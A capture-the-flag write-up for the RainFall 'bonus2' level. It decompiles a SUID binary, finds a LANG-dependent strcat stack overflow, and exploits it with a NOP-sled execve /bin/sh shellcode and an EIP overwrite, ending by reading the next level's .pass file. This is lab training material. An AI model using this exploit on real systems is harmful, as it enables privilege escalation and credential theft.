@@ -1,0 +1,157 @@
+When we change to bonus2 user, we're greeted with:
+
+```shell
+RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
+No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   /home/user/bonus2/bonus2
+```
+
+We find another SUID executable, this time owned by bonus3.
+
+```shell
+bonus1@RainFall:~$ ls -l
+total 8
+-rwsr-s---+ 1 bonus3 users 5566 Mar  6  2016 bonus2
+```
+
+When executing, it exits.
+
+```shell
+bonus2@RainFall:~$ ./bonus2 
+bonus2@RainFall:~$ ./bonus2 hi
+bonus2@RainFall:~$
+```
+
+Copying it over and decompiling.
+
+```shell
+┌──(kali㉿kali)-[~]
+└─$ scp -P 4242 bonus2@192.168.184.128:/home/user/bonus2/bonus2 .
+          _____       _       ______    _ _
+         |  __ \     (_)     |  ____|  | | |
+         | |__) |__ _ _ _ __ | |__ __ _| | |
+         |  _  /  _` | | '_ \|  __/ _` | | |
+         | | \ \ (_| | | | | | | | (_| | | |
+         |_|  \_\__,_|_|_| |_|_|  \__,_|_|_|
+
+                 Good luck & Have fun
+
+  To start, ssh with level0/level0 on 192.168.184.128:4242
+bonus2@192.168.184.128's password:
+bonus2                                                                                                                                100% 5366   892.7KB/s   00:00
+```
+
+The decompiled code looks like this
+
+```c
+void greetuser(int32_t arg_4h)
+{
+    char *s2;
+    char *s1;
+    undefined4 uStack_48;
+    undefined4 uStack_44;
+    undefined4 uStack_40;
+    undefined2 uStack_3c;
+    char cStack_3a;
+    
+    if (_language == 1) {
+        s1 = (char *)0xc3767948;
+        uStack_48 = 0x20a4c3a4;
+        uStack_44 = 0x69a4c370;
+        uStack_40 = 0xc3a4c376;
+        uStack_3c = 0x20a4;
+        cStack_3a = '\0';
+    } else if (_language == 2) {
+        s1 = (char *)0x64656f47;
+        uStack_48 = 0x64696d65;
+        uStack_44 = 0x21676164;
+        uStack_40 = CONCAT22(uStack_40._2_2_, 0x20);
+    } else if (_language == 0) {
+        s1 = (char *)0x6c6c6548;
+        uStack_48 = CONCAT13(uStack_48._3_1_, 0x206f);
+    }
+    strcat(&s1, &arg_4h);
+    puts(&s1);
+    return;
+}
+
+undefined4 main(char **argv, char **envp)
+{
+    undefined4 uVar1;
+    char *pcVar2;
+    int32_t iVar3;
+    char **ppcVar4;
+    char **ppcVar5;
+    uint8_t uVar6;
+    char *arg_4h;
+    char *src;
+    size_t var_a8h;
+    size_t n;
+    char *dest;
+    char *s1;
+    int32_t var_10h;
+    
+    uVar6 = 0;
+    if (argv == (char **)0x3) {
+        ppcVar4 = &dest;
+        for (iVar3 = 0x13; iVar3 != 0; iVar3 = iVar3 + -1) {
+            *ppcVar4 = (char *)0x0;
+            ppcVar4 = ppcVar4 + 1;
+        }
+        strncpy();
+        strncpy();
+        arg_4h = "LANG";
+        pcVar2 = (char *)getenv();
+        s1 = pcVar2;
+        if (pcVar2 != (char *)0x0) {
+            iVar3 = memcmp();
+            if (iVar3 == 0) {
+                _language = 1;
+                arg_4h = pcVar2;
+            } else {
+                arg_4h = s1;
+                iVar3 = memcmp();
+                if (iVar3 == 0) {
+                    _language = 2;
+                }
+            }
+        }
+        ppcVar4 = &dest;
+        ppcVar5 = (char **)&stack0xffffff50;
+        for (iVar3 = 0x13; iVar3 != 0; iVar3 = iVar3 + -1) {
+            *ppcVar5 = *ppcVar4;
+            ppcVar4 = ppcVar4 + (uint32_t)uVar6 * -2 + 1;
+            ppcVar5 = ppcVar5 + (uint32_t)uVar6 * -2 + 1;
+        }
+        uVar1 = greetuser((int32_t)arg_4h);
+    } else {
+        uVar1 = 1;
+    }
+    return uVar1;
+}
+```
+
+The program takes 2 arguments as input and depends on the `LANG` environment, it will output accordingly. We found that can we overflow and segfault the program if the second argument is long enough. So we used the pattern generator and found the offset at 18 in the argument with `LANG=fi`.
+
+That means we can overwrite the EIP, so we decide to return to shellcode in the environment similar to last exercise, but for some reason, the address that the program take is a bit randomize, so we create a big NOP sledge.
+
+```shell
+export A=$(python -c "print '\x90'*1000 + '\x31\xc0\x99\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x
+89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80'")
+bonus2@RainFall:~$ /tmp/a.out
+Argument vector:
+ 0: 0xbffff4f7 /tmp/a.out
+Environment vector:
+ 2: 0xbffff502 A=����������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������1��Ph//shh/bin��PS��
+```
+
+With that we can build the payload.
+
+```shell
+bonus2@RainFall:~$ export LANG=fi
+bonus2@RainFall:~$ ./bonus2 $(python -c "print 'A'*40") $(python -c "print 'B'*18 + '\x04\xf5\xff\xbf'")
+Hyvää päivää AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBB���
+$ whoami
+bonus3
+$ cat /home/user/bonus3/.pass
+71d449df0f960b36e0055eb58c14d0f5d0ddc0b35328d657f91cf0df15910587
+```
